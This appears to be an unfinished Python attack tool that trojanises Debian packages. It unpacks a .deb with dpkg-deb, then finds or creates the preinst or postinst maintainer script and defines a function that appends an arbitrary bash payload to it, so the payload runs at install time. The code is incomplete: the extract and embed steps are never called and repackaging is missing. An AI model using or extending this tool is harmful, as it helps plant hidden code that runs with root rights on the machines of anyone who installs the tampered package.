#!/usr/bin/python3

'''
Tool Name ::
Author :: Padsala Trushal #changing this line doesn't make you developer
Date :: 24 Oct 2021
'''

import os
import argparse
import sys
from colorama import Fore, Style


def get_arguments():
	parser = argparse.ArgumentParser(description='Inject bash script in debian package',usage=f'python3 {sys.argv[0]} -p debian_package -s bash_script',epilog=f'EXAMPLE - python3 {sys.argv[0]} -p /tmp/file.deb -s /tmp/script.sh')

	parser.add_argument('-v','--version',action='version',version='1.4',help='show the version of program')

	parser.add_argument('-s',metavar='bash script',dest='bash',help='Enter your bash script path')


	parser.add_argument('-p',metavar='debian package',dest='deb',help='Enter your debian package path')

	args = parser.parse_args()

	if len(sys.argv) <= 4:
		parser.print_usage()
		sys.exit()
		
	return args

args = get_arguments()


deb = args.deb
bash = args.bash

if ".deb" not in deb:
	sys.stderr.write("Enter vaild debian file")
	sys.exit()

if ".sh" not in bash:
	sys.stderr.write("Enter vaild bash file")
	sys.exit()


if not os.path.exists(deb) or not os.path.exists(bash):
    print("[+] File Does Not Exists")
    sys.exit(1)


def read_content(script: str):
    file = open(script, 'r')
    content = file.read()
    file.close()
    return content

payload = read_content(bash)



def color_print(string: str , color: str, bold=False):
	colors = {'red': Fore.RED,'blue': Fore.BLUE,
	'green': Fore.GREEN,'yello': Fore.YELLOW}
	if bold:
		print(Style.BRIGHT+colors[color]+string+Style.RESET_ALL)
	else:
		print(colors[color]+string+Style.RESET_ALL)





#print(payload)
#color_print(f'{payload}','red')
#color_print(f'{payload}','green',True)


def extract(file):
	cmd = f"dpkg-deb -R {file} /tmp/{file.split('.deb')[0]}"  
	os.system(cmd)

#extract(deb)

debpath = f"/tmp/{deb.split('.deb')[0]}/"
print(debpath)

postinst = debpath+"DEBIAN/postinst"
preinst = debpath+"DEBIAN/preinst"


def checkforinjectablefile():
	global postrm,preinst
	if os.path.exists(postinst) or os.path.exists(preinst):
		if os.path.exists(preinst):
			return preinst
		else:
			return postinst	

	else:
		file = open(preinst,'w+')
		file.close()
		os.chmod(preinst,0o755)
		return preinst


	print("this function working fine!!")

checkforinjectablefile()


def embed(script: str, payload: str):
	file = open(script,'a')
	file.write(payload)
	file.close()


